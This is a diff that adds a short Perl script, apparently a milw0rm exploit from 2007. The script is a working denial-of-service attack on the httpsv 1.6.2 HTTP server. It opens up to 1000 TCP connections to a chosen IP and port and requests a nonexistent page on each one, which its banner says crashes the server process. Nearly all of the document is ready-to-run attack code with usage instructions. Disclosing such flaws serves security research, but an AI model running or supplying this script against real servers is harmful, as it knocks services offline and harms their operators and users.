@@ -1,0 +1,39 @@
+#!/usr/bin/perl
+#GetOpt STD module
+use IO::Socket;
+use Getopt::Std;
+getopts(":i:p:",\%args);
+if(defined $args{i}){
+$ip = $args{i};
+}
+if(defined $args{p}){
+$port = $args{p};
+}
+if(!defined $args{i} or !defined $args{p}){
+print "-----------------------------------------------------\n";
+print "HTTP SERVER (httpsv1.6.2) 404 Denial of Services\n";
+print "Site: http://httpsv.sourceforge.net/\n ";
+print "Info: If u send to the server between 40-1000 requests\n";
+print "to nonexisting pages the process will die.\n";
+print "Found By Prili - imprili[at]gmail.com\n";
+print "Usage: perl $0 -i <ip address> -p <port> \n";
+print "Thanks to shinnai for the inspiration.\n";
+print "-----------------------------------------------------\n";
+exit;
+}
+$protocol = "tcp";
+while ($i<=1000)
+{
+$request = "GET /AAAAAAA HTTP/1.0 \n\n";
+$socket = IO::Socket::INET->new(PeerAddr=>$ip,
+                               PeerPort=>$port,
+                               Proto=>$protocol,
+                               Timeout=>'1') || die "Can't connect to address!\n";
+                               
+print "sending request number $i...\n";
+print $socket $request;
+close($socket);
+$i++;
+}
+
+# milw0rm.com [2007-06-21]
